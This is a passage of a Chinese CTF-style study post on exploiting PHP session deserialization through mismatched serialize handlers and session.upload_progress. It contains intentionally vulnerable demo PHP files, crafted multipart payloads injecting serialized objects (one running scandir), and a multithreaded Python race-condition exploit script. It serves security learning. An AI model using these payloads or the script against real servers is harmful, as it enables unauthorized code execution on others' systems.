<p><code>https://y4tacker.github.io/2022/06/19/year/2022/6/%E5%85%B3%E4%BA%8Epearcmd%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</code></p>
<p><code>https://yuy0ung.github.io/2024/03/27/pearcmd/</code></p>
]]></content>
      <categories>
        <category>文件包含</category>
        <category>利用pearcmd.php</category>
      </categories>
  </entry>
  <entry>
    <title>session反序列化学习</title>
    <url>/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>好用，爱用，多用</p>
<span id="more"></span>

<h4 id="PHP-session的说明"><a href="#PHP-session的说明" class="headerlink" title="PHP session的说明"></a>PHP session的说明</h4><h5 id="php-session的定义"><a href="#php-session的定义" class="headerlink" title="php session的定义"></a>php session的定义</h5><p><strong>先说明一下什么是Session：</strong><br><em>Session一般称为“会话控制”，简单来说就是一种客户与网站&#x2F;服务器更为安全的对话方式。一旦开启了 <code>session</code> 会话，便可以在网站的任何页面使用或保持这个会话</em>，从而让访问者与网站之间建立了一种“对话”机制。不同语言的会话机制可能有所不同。</p>
<p><strong>PHP session：</strong></p>
<p><u>PHP session可以看做是一个特殊的变量，且该变量是用于存储关于用户会话的信息，或者更该用户会话的设置</u>，需要注意的是，**<code>PHP Session</code> 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的*<em>，</em>且其对应的具体 <code>session</code> 值会存储于服务器端*，这也是与 <code>cookie</code>的主要区别，所以<code>seesion</code> 的安全性相对较高。</p>
<h5 id="PHP-session的工作流程"><a href="#PHP-session的工作流程" class="headerlink" title="PHP session的工作流程"></a>PHP session的工作流程</h5><p>会话工作流程很简单，当开始一个会话时，PHP会尝试从请求中查找会话ID（通常通过会话cookie），如果发现请求的<code>Cookie</code>、<code>Get</code>、<code>Post</code>中不存在<code>session id</code>，PHP就会自动调用<code>php_session_create_id</code>函数创建一个新的会话,并且在<code>http response</code>中通过<strong>set-cookie头部发送给客户端保存</strong>。</p>
<p>有时候浏览器用户设置会禁止 <code>cookie</code>，当在客户端<code>cookie</code>被禁用的情况下，php也可以自动将<code>session id</code>添加到url参数中以及<code>form</code>的<code>hidden</code>字段中，但这需要将<code>php.ini</code>中的<code>session.use_trans_sid</code>设为开启，也可以在运行时调用<code>ini_set</code>来设置这个配置项。</p>
<p><strong>会话开始后，PHP就会将会话中的数据设置到<code>$_SESSION</code>变量中</strong>，如下述代码就是一个在<code>$_SESSION</code>变量中注册变量的例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&#x27;username&#x27;])) &#123;</span><br><span class="line">  $_SESSION[&#x27;username&#x27;] = &#x27;xianzhi&#x27; ;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>当PHP停止的时候，它会自动读取<code>$_SESSION</code>中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存</strong></p>
<p>默认情况下<em>，PHP 使用内置的文件会话保存管理器来完成<code>session</code>的保存，<strong>也可以通过配置项 <code>session.save_handler</code> 来修改所要采用的会话保存管理器</strong></em>。 <em>对于文件会话保存管理器，会将会话数据保存到配置项<code>session.save_path</code>所指定的位置</em>。可参考下图：<br><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422113603242-17142857356101.png" alt="image-20240422113603242"></p>
<h5 id="PHP-session在php-ini中的配置"><a href="#PHP-session在php-ini中的配置" class="headerlink" title="PHP session在php.ini中的配置"></a>PHP session在php.ini中的配置</h5><p><code>PHP session</code>在<code>php.ini</code>中主要存在以下配置项:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session.save_handler=files     该配置主要设定用户自定义存储函数，如果想使用PHP内置session存储机制之外的可以使用这个函数  这里表明session是以文件的方式来进行存储的</span><br><span class="line"></span><br><span class="line">session.serialize_handler=php       该配置主要设定用户自定义存储函数  这里表明session的默认序列话引擎使用的是php处理器引擎</span><br><span class="line"></span><br><span class="line">session.save_path=&quot;D:\PHP\phpStudy\PHPTutorial\tmp\tmp&quot; 该配置主要设置session的存储路径  这里表明所有的session文件都是存储在xampp/tmp下</span><br><span class="line"></span><br><span class="line">session.auto_start=0                表明默认不启动session</span><br></pre></td></tr></table></figure>



<ul>
<li>session.save_handler&#x3D;””</li>
</ul>
<p>​        <strong>该配置主要设定用户自定义存储函数</strong>，如果想使用PHP内置<code>session</code>存储机制之外的可以使用这个函数</p>
<ul>
<li><strong>session.serialize_handler</strong></li>
</ul>
<p><u>定义用来序列化&#x2F;反序列化的处理器名字，默认使用<code>php</code></u>，还有其他引擎，且不同引擎的对应的session的存储方式不相同，具体可见下文所述</p>
<p>等<a href="https://xz.aliyun.com/t/6640?time__1311=n4+xnD0DRDBGitN4q05+bDyiDumxc7l1lZZYD&alichlgref=https://cn.bing.com/#toc-0">参考</a>，下面主要谈谈<code>session.serialize_handler</code>配置项。</p>
<h4 id="PHP-session的处理器及如何利用"><a href="#PHP-session的处理器及如何利用" class="headerlink" title="PHP session的处理器及如何利用"></a>PHP session的处理器及如何利用</h4><p>上文中提到的PHP session的<strong>序列化机制是由<code>session.serialize_handler</code>来定义引擎的</strong>，引擎也就是php处理器，<em>而序列化后的字符串默认是以文件的方式存储</em>，<em>且存储的文件是由<code>sess_sessionid</code>来决定文件名的</em>，如下：</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240425202003456.png" alt="image-20240425202003456"></p>
<p>当然这个文件名也不是不变的，如<code>Codeigniter</code>框架的 <code>session</code>存储的文件名为<code>ci_sessionSESSIONID</code>等。</p>
<p>并且文件的内容始终是session值的序列化之后的内容。</p>
<h5 id="利用函数先说明"><a href="#利用函数先说明" class="headerlink" title="利用函数先说明"></a>利用函数先说明</h5><p>1.PHP提供了<code>session.serialize_handler</code>配置的选项，可以用来定义要使用的处理器，默认是php，如果想要使用其他的就需要<strong>使用ini_set()函数</strong>，格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span><br><span class="line">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_serialize&quot;);</span><br><span class="line">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_binary&quot;);</span><br></pre></td></tr></table></figure>

<p>2.要想使用session，第一步就是开启session，这也是session的第一阶段这是就需要使用<strong>session_start()函数</strong>。</p>
<p><strong>这个函数的作用就是开启session</strong>，开启之后读取cookie信息判断是否存在session_id，<u>如果存在就是用这个session_id</u>，如果没有就会随机生成一个唯一的32位的session_id。通过这个session_id就可以绑定一个唯一的用户。</p>
<p><strong>这个过程还会初始化<code>$SESSION</code>这个变量，但是有两种情况：</strong></p>
<ul>
<li><p><strong>若没有这个session文件</strong>，就会读取cookie信息的内容从而序列化数据创建<code>$_SESSION</code>变量并创建一个session文件；</p>
</li>
<li><p><strong>若存在session文件</strong>，读取session文件中的内容，把内容反序列化之后赋值到<code>$SESSION</code>这个变量中**，这个阶段还有一个特别关键的作用，还会判断那些session文件已经过期，调用gc进程，删除掉过期的session文件</p>
</li>
</ul>
<p><a href="https://www.cnblogs.com/daijiandong/p/12070947.html">参考1</a>以及<a href="https://blog.csdn.net/cs23405/article/details/81297698">2</a></p>
<h5 id="php处理器"><a href="#php处理器" class="headerlink" title="php处理器"></a>php处理器</h5><p><strong><code>sessin.serialize_handler</code>定义的引擎有三种</strong>，如下表所示：</p>
<table>
<thead>
<tr>
<th>处理器名称</th>
<th>存储格式</th>
</tr>
</thead>
<tbody><tr>
<td>php</td>
<td>键名+竖线+经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_binary</td>
<td>键名的长度对应的<strong>ASCII字符</strong>（如键长为35则对应<code>#</code>）+键名+经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_serialize</td>
<td>经过<code>serialize()</code>函数序列化处理的<strong>数组</strong></td>
</tr>
</tbody></table>
<p><strong>注</strong>：从PHP 5.5.4起可以使用<code>php_serialize</code></p>
<p><u>上述三种处理器中</u>，*<code>php_serialize</code>在内部简单地直接使用 <code>serialize/unserialize</code>函数*，并且不会有<code>php</code>和 <code>php_binary</code>所具有的限制。 使用较旧的序列化处理器导致<code>$_SESSION</code> 的索引既不能是数字也不能包含特殊字符(<code>|</code> 和 <code>!</code>) 。</p>
<p>测试一下，demo如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h6 id="php"><a href="#php" class="headerlink" title="php"></a>php</h6><p>如图所示：<br><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422192647948.png" alt="image-20240422192647948"></p>
<p>解析一下：<br>序列化的结果为:<code>session|s:6:&quot;Fupanc&quot;;</code></p>
<p>其中<code>session</code>为$_SESSION[‘session’]的键名，<code>|</code>为传入GET参数经过序列化后的值。</p>
<h6 id="php-binary处理器"><a href="#php-binary处理器" class="headerlink" title="php_binary处理器"></a>php_binary处理器</h6><p>将指定处理器函数的参数php改为这个就行，为了方便看，将键名改长一些，（否则对应的ascii字符不可见)，测试结果如下</p>
<p>demo改为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_binary&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;sessionseesionsessionsessionsession&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422193133901.png" alt="image-20240422193133901"></p>
<p>两张图片可以对比一下</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422200413609.png" alt="image-20240422200413609"></p>
<p>序列化的结果为：<code>#sessionsessionsessionsessionsessions:6:&quot;Fupanc&quot;;</code></p>
<p>解析一下：<br><code>#</code>即为长度为35在ascii对应的符号</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422200554081.png" alt="image-20240422200554081"></p>
<p><code>sessionsessionsessionsessionsessions</code>是键名,</p>
<p><strong>注意：</strong>这里序列化后的结果会在原代码设置的键名后加一个s，测试了一下，无论大写为多少。</p>
<p><code>6:&quot;Fupanc&quot;;</code>即为序列化后的字符串。</p>
<h6 id="php-serialize-处理器"><a href="#php-serialize-处理器" class="headerlink" title="php_serialize 处理器"></a>php_serialize 处理器</h6><p>demo如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>测试结果：<br><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422201421239.png" alt="image-20240422201421239"></p>
<p>序列化结果为：<code>a:1:&#123;s:7:&quot;session&quot;;s:6:&quot;Fupanc&quot;;&#125;</code></p>
<p>解析：<br><code>a:1</code>表示<code>$_SESSION</code>数组中有一个元素，或括号里面的内容即为传入GET参数经过序列化后的值。</p>
<h5 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h5><h6 id="自建环境测试"><a href="#自建环境测试" class="headerlink" title="自建环境测试"></a>自建环境测试</h6><p>建造一个环境，有两个文件，分别如下：</p>
<p>flag.php：</p>
<p>这个页面用于接受session的值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>1.php：</p>
<p>这个页面用于测试反序</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handller&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="variable language_">$this</span>-&gt;name=<span class="string">&#x27;haha&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">print_r</span>(<span class="variable">$this</span>-&gt;name);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先访问1.php，输出</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240423203335935.png" alt="image-20240423203335935"></p>
<p>这里开启了<code>session_start()</code>函数，可以在flag.php页面利用session变量进行反序列化。如下构造payload：</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240425202531645.png" alt="image-20240425202531645"></p>
<p>再在flag.php页面传入这个参，但是需要在前面加上一个<code>|</code>，这是因为php处理器会把|前面的内容当做键，后面的内容才会被反序列化后赋值给session变量</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240423203811665.png" alt="image-20240423203811665"></p>
<p>在电脑上看一看此时session的值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:1:&#123;s:7:&quot;session&quot;;s:40:&quot;|O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:6:&quot;diyici&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以看到成功写入，这是再访问以下1.php</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240425202506406.png" alt="image-20240425202506406"></p>
<p>成功反序。</p>
<p><strong>但是这里的局限性太大，有如下条件：</strong></p>
<ul>
<li>两个文件session引擎配置不同</li>
<li>其中一个session可控</li>
<li>两个文件同域</li>
</ul>
<p>这个只是一个简单的复现过程，真实题目应该不能自己传session进去，现在看看稍真实页面是如何打的。</p>
<h6 id="利用session-upload-progress进行反序列化-方式一"><a href="#利用session-upload-progress进行反序列化-方式一" class="headerlink" title="利用session.upload_progress进行反序列化-方式一"></a>利用session.upload_progress进行反序列化-方式一</h6><p>结合下述Session上传进度，<strong>这个方法需要php≥5.4</strong></p>
<p><a href="https://bugs.php.net/bug.php?id=71101">漏洞官方说明</a></p>
<p>这个漏洞条件官方说的挺清楚的，简单说明一下使用这个方法的条件</p>
<p>条件：</p>
<ol>
<li><code>session.upload_progress.enabled = On</code>（是否启用上传进度报告）</li>
<li><code>session.upload_progress.cleanup = Off</code>（是否上传完成之后删除session文件-这里需要为Off）</li>
</ol>
<p>这两个都是可在查的</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240423211803946.png" alt="image-20240423211803946"></p>
<p><strong>当enabled被设置为on时，此时再往服务器中上传一个文件时，PHP会把该文件的详细信息（如上传时间、上传进度等）存储到session，所以上传文件进度的报告就会以写入到session文件中</strong>，所以我们<u>可以设置一个与<code>session.upload_progress.name</code>同名的变量(默认名为<code>PHP_SESSION_UPLOAD_PROGRESS</code>)，PHP检测到这种同名请求会在<code>$_SESSION</code>中添加一条数据</u>。我们就可以控制这个数据内容为我们的恶意payload</p>
<p><strong>对session上传进度说明一下：</strong></p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/1647333728_62305160591d530edf695.jpeg" alt="image-20220315161551104"></p>
<p>但是需要自己构造一个<strong>文件上传表单</strong>，代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://web.jarvisoj.com:32784/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>，在上传文件(必须上传)时抓包，直接借用官方的说明，有两种改法（第二种待验证）来进行反序：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-POST_RAW--</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------20896060251896012921717172737</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHPSESSID&quot;</span><br><span class="line"></span><br><span class="line">session-data-injection</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">|xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxO:3:&quot;obj&quot;:0:&#123;&#125;</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;file.txt&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">-----------------------------20896060251896012921717172737--</span><br></pre></td></tr></table></figure>

<p>第一个就是上述官方改法，还有一个是在<a href="https://www.freebuf.com/articles/web/324943.html">文章</a>里看到可以改将filename那个file.txt改成payload(文章基本都是这样改的，在值里面改肯能会应该出现|导致数据写入session失败)</p>
<p><strong>但是文件名需要注意防止引号被转义同时也是为了防止与最外层的双引号冲突</strong>，需要使用\来说明，借用文章代码说明一下（待验证-还是很多文章都在用这种改法）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----------------------------23899461075638356511525184357</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">-----------------------------23899461075638356511525184357</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">-----------------------------23899461075638356511525184357--</span><br></pre></td></tr></table></figure>

<p><strong>上传成功就可以直接在Index.php页面利用这个payload</strong></p>
<h6 id="利用session-upload-progress进行反序列化-方式二"><a href="#利用session-upload-progress进行反序列化-方式二" class="headerlink" title="利用session.upload_progress进行反序列化-方式二"></a>利用session.upload_progress进行反序列化-方式二</h6><p><strong>同样需要php≥5.4</strong></p>
<p>这个方法着重于解决当配置如下使如何解决,一般这个是php.ini的默认项：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. session.upload_progress.enabled = on</span><br><span class="line">2. session.upload_progress.cleanup = on</span><br><span class="line">3. session.upload_progress.prefix = &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">5. session.upload_progress.freq = &quot;1%&quot;</span><br><span class="line">6. session.upload_progress.min_freq = &quot;1&quot;</span><br></pre></td></tr></table></figure>

<p>这里与上面的最主要的区别就是<code>session.upload_progress.cleanup = on</code>，<u>表示当文件上传结束后，php将会立即清空对应session文件中的内容</u>，也就代表我们每次<strong>正常访问</strong>session文件时都是<strong>空文件</strong>。所以想要利用就需要竞争。</p>
<p><strong>如果cleanup被设置为On，就需要使用条件竞争</strong></p>
<p>&#x3D;&#x3D;还有一个比较重要的配置：&#x3D;&#x3D;<br><code>session.use_strict_mode=off</code>，这个选项默认值为off，表示我们对cookie中的sessionid可控。这一点很重要。</p>
<p>开始解析：</p>
<p>1. </p>
<ul>
<li>配置文件中的<code>session.use_strict_mode</code>默认为0时，这个情况下，用户可以定义自己的sessionid，例如当用户在cookie中设置<code>sessionid=Lxxx</code>时，PHP就会生成一个文件<code>/tmp/sess_Lxxx</code>，此时也就初始化了session，并且会将上传的文件信息写入到文件<code>/tmp/sess_Lxxx</code>中去。</li>
<li>由于<strong>在这种情况下cleanup的值为on</strong>，所以文件上传成功后文件内容会马上被清空，此时就需要利用Python的多线程来条件竞争</li>
</ul>
<p>脚本如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">ip,port</span>):</span><br><span class="line">    </span><br><span class="line">    f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> *<span class="number">1024</span>*<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        et.wait()</span><br><span class="line">        url = <span class="string">&#x27;http://&#x27;</span>+ip+<span class="string">&#x27;:&#x27;</span>+<span class="built_in">str</span>(port)+<span class="string">&#x27;/test5.php&#x27;</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;DNT&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;PHPSESSID=20190506&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        proxy = &#123;</span><br><span class="line">        <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;127.0.0.1:8080&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;123&#x27;</span>&#125;</span><br><span class="line">        files=&#123;</span><br><span class="line">            <span class="string">&#x27;file&#x27;</span>:(<span class="string">r&#x27;|O:4:\&quot;Door\&quot;:1:&#123;s:6:\&quot;handle\&quot;;O:2:\&quot;IP\&quot;:1:&#123;s:2:\&quot;ip\&quot;;s:10:\&quot;phpinfo();\&quot;;&#125;&#125;&#x27;</span>,f,<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        resp = requests.post(url,headers=headers,data=data,files=files,proxies=proxy) <span class="comment">#,proxies=proxy</span></span><br><span class="line">        resp.encoding=<span class="string">&quot;utf-8&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(resp.text)&lt;<span class="number">2000</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+++++]retry&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(resp.content.decode(<span class="string">&#x27;utf-8&#x27;</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            et.clear()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;success!&#x27;</span>)</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ip=sys.argv[<span class="number">1</span>]</span><br><span class="line">    port=<span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    et=threading.Event()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">        threading.Thread(target=exp,args=(ip,port)).start()</span><br><span class="line">    et.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>

<p>最后<strong>把脚本中的代理去掉</strong>，直接跑<code>exp.py</code>，定义格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python exp.py 127.0.0.1 2333</span><br></pre></td></tr></table></figure>

<p>效果如下:<br><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/1557146899_5cd02d139da64.jpeg" alt="利用session.upload_progress进行文件包含和反序列化渗透"></p>
<p>参考文章:<code>https://www.freebuf.com/vuls/202819.html</code></p>
<p>其他例题参考：<br>1.简单过程说明以及其他ctf题解<a href="https://xz.aliyun.com/t/6640?time__1311=n4+xnD0DRDBGitN4q05+bDyiDumxc7l1lZZYD&alichlgref=https://cn.bing.com/#toc-9">文章</a></p>
]]></content>
      <categories>
        <category>php反序列化</category>
        <category>session反序列化</category>
      </categories>
  </entry>
</search>
